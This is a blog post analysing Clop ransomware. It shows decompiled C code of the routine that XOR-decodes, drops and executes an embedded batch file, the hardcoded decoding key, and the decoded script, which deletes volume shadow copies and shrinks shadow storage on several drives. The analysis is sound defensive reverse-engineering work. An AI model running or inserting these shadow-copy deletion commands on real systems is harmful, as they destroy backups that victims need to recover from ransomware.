+++
title = "Deobfuscating Clop ransomware resources"
description = "A deobfuscator tool for extracted resources from Clop ransomware"
tags = [
    "ransomware",
    "clop",
    "reverse-engineering"
]
date = "2019-03-31"
categories = [
    "Malware",
    "Reverse Engineering",
]
author = "Dan"
summary = true 
+++

[A colleague](https://github.com/digitalcroqueta) and I reverse-engineered the Clop ransomware binary, and observed that it contained two obfuscated resources:

* SIXSIX
* SIXSIX1

One of them is just the README file that the malware drops all over the disk, so nothing too exciting, but the other is a batch script that deletes the volume shadow copies. Granted, you could just debug it and get it to drop these files, but as a personal challenge I decided to write a deobfuscator based on my analysis of the decompiled code (I looked at it in both Ghidra and IDA Pro, the latter of which was much more helpful in this case). After spending a bit of time labeling each variable/function, this is the relevant decompiled section of code:

```
HINSTANCE LoadExecuteClearSystemsBatchFile()
{
  HMODULE hModule; // eax
  HMODULE phModule; // ebx
  HRSRC hRsrcSIXSIX1; // eax
  HRSRC phRsrcSIXSIX1; // esi
  HGLOBAL hGlobalRsrcSIXSIX1; // eax
  const void *ResourceLock; // edi
  DWORD cbResourceSIXSIX1; // esi
  HGLOBAL hDecryptedResourceMemory; // ebx
  DWORD pcbResourceSIXSIX1; // edi
  DWORD i; // esi
  HANDLE hDecryptedFile; // esi
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-214h]
  DWORD nNumberOfBytesToWrite; // [esp+10h] [ebp-210h]
  CHAR currentPath; // [esp+14h] [ebp-20Ch]
  CHAR FileName; // [esp+118h] [ebp-108h]

  hModule = GetModuleHandleW(0);
  phModule = hModule;
  hRsrcSIXSIX1 = FindResourceW(hModule, (LPCWSTR)0xF447, L"SIXSIX1");
  phRsrcSIXSIX1 = hRsrcSIXSIX1;
  hGlobalRsrcSIXSIX1 = LoadResource(phModule, hRsrcSIXSIX1);
  ResourceLock = LockResource(hGlobalRsrcSIXSIX1);
  cbResourceSIXSIX1 = SizeofResource(phModule, phRsrcSIXSIX1);
  nNumberOfBytesToWrite = cbResourceSIXSIX1;
  hDecryptedResourceMemory = GlobalAlloc(GMEM_ZEROINIT, cbResourceSIXSIX1);
  memmove(hDecryptedResourceMemory, ResourceLock, cbResourceSIXSIX1);
  pcbResourceSIXSIX1 = cbResourceSIXSIX1;
  for ( i = 0; i < pcbResourceSIXSIX1; ++i )
    *((_BYTE *)hDecryptedResourceMemory + i) ^= charArrMagicStr[i % 0x42];
  GetCurrentDirectoryA(260u, &currentPath);
  wsprintfA(&FileName, "%s\\clearsystems-10-1.bat", &currentPath);
  NumberOfBytesWritten = 0;
  hDecryptedFile = CreateFileA(&FileName, 0x40000000u, 2u, 0, 4u, 0x80u, 0);
  if ( hDecryptedFile != (HANDLE)-1 )
  {
    WriteFile(hDecryptedFile, hDecryptedResourceMemory, pcbResourceSIXSIX1, &NumberOfBytesWritten, 0);
    CloseHandle(hDecryptedFile);
  }
  GlobalFree(hDecryptedResourceMemory);
  return ShellExecuteA(0, "open", &FileName, 0, 0, 0);
}
```

Beginning with this decompiled code, I quickly whipped up [a deobfuscator in C++](https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.cpp), basically mimicking the decompiled code (with a couple minor shortcuts), which [I've made available on GitHub.](https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.cpp) Shortly thereafter, I decided to write [a Python 3 version](https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.py) that is much shorter (and cross-platform compatible), which is [now also on my GitHub.](https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.py)

The ransomware has a harcoded "magic" string that it uses to deobfuscate the resources:

```
CHAR clopDecodeResourceSIXSIX1_MagicString[] = "Clopfdwsjkjr23LKhuifdhwui73826ygGKUJFHGdwsieflkdsj324765tZPKQWLjwNVBFHewiuhryui32JKG";
```

From there it iterates over each byte in the file and XORs it by itself and the modulus (remainder) of the current byte offset and `0x42` (decimal value `66`) as an offset/subscript into the magic string:

```
*((BYTE *)hResourceMemory + i) ^= clopDecodeResourceSIXSIX1_MagicString[i % 66];
```

And here's our prize:

```
@echo off
vssadmin Delete Shadows /all /quiet
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
vssadmin Delete Shadows /all /quiet
```

That's really all there is to it. The rest of the code is mostly just memory management and writing the deobfuscated data to a file.

